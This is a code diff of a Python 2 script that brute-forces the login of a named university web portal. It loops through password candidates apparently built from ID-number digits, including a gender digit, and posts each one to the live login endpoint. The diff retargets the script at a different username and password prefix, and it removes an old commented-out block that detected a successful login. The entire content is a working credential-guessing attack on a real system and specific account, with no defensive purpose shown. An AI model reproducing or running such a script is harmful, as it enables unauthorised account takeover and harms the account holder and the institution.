@@ -3,7 +3,7 @@ import requests
 
 request_url = "http://w.nuaa.edu.cn/iPortal/action/doLogin.do"
 login_info = {
-                'username':'70204903',
+                'username':'70204838',
                 'password': '',
                 'saved': '1',
                 "from": '003cc944be32e25365428f2dd2adbbe2',
@@ -40,7 +40,7 @@ for i in range(31):
         for k in range(10):
             for m in range(5):
                 for n in range(10):
-                    password='04'+password_index[j]+password_index[k]+password_female[m]+password_index[n]
+                    password='27'+password_index[j]+password_index[k]+password_female[m]+password_index[n]
             #print password
                     login_info['password']=password
                     print password
@@ -50,15 +50,5 @@ for i in range(31):
                         break
 
 
-'''
-r = requests.post(request_url,data=login_info,headers=headers)
-r1 = requests.get("http://www.cnblogs.com/Ninputer/default.html?page=2")
-print r.headers
-print r1.content
-#print r1.content
-loginRequest = requests.post(request_url,data=login_info,headers=headers)
-if(loginRequest.headers['content-length']=='1289'):
-    print loginRequest.headers['content-length']
 
-'''
 
